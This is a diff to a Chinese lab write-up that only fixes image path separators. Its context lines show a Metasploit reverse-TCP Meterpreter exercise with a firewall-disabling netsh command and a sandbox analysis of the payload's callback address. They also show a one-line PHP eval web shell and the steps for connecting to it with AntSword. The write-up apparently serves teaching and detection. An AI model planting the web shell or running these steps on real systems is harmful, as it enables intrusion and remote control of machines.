@@ -40,7 +40,7 @@ file payload.exe
 
 > 反向连接：靶机运行 payload 后主动连接攻击机，可绕过目标入站防火墙。
 
-![](images\01-make_payload.png)
+![](images/01-make_payload.png)
 
 ---
 
@@ -69,7 +69,7 @@ exploit
 
 显示 `Started reverse TCP handler` 即监听就绪。
 
-![](images\02-listen.png)
+![](images/02-listen.png)
 
 ### 2.3 靶机运行被控端
 
@@ -91,7 +91,7 @@ netsh advfirewall set allprofiles state off
 meterpreter >
 ```
 
-![](images\03-reverse_tcp.png)
+![](images/03-reverse_tcp.png)
 
 ### 2.5 验证控制权限
 
@@ -104,7 +104,7 @@ getuid
 
 可查看目标系统信息和当前权限，确认已实现远程控制。
 
-![](images\04-attack_success.png)
+![](images/04-attack_success.png)
 
  ---
 
@@ -126,9 +126,9 @@ https://s.threatbook.com/
 
 报告给出：这是一个MSF 生成的 Meterpreter 反弹 shell，被一个自写的 7KB C 语言加载器（VS2022 编译，`VirtualProtect` + 内存跳转）包装，配置为连接 `192.168.10.129:5000`
 
-![](images\05-detect.png)
+![](images/05-detect.png)
 
-![](images\10-detect2.png)
+![](images/10-detect2.png)
 
 ---
 
@@ -142,7 +142,7 @@ https://s.threatbook.com/
 <?php @eval($_POST['cmd']); ?>
 ```
 
-![](images\06-create.png)
+![](images/06-create.png)
 
 ### 4.2 蚁剑连接
 
@@ -152,17 +152,17 @@ https://s.threatbook.com/
    - 密码：`cmd`（与 PHP 中 `$_POST['cmd']` 一致）
    - 编码器：`base64`
 
-![](images\07-connect.png)
+![](images/07-connect.png)
 
    3.保存，双击该条目连接
 
    4.成功后进入图形化文件管理界面，可浏览、上传、下载、编辑文件，打开「虚拟终端」执行命令
 
-![](images\08-success.png)
+![](images/08-success.png)
 
  右键打开虚拟终端，执行命令
 
-![](images\09-terminal.png)
+![](images/09-terminal.png)
 
 > 若蚁剑连接失败，检查：木马是否为 eval 版本、连接密码是否与 POST 参数名一致、Web 服务是否正常、URL 路径是否正确。
 
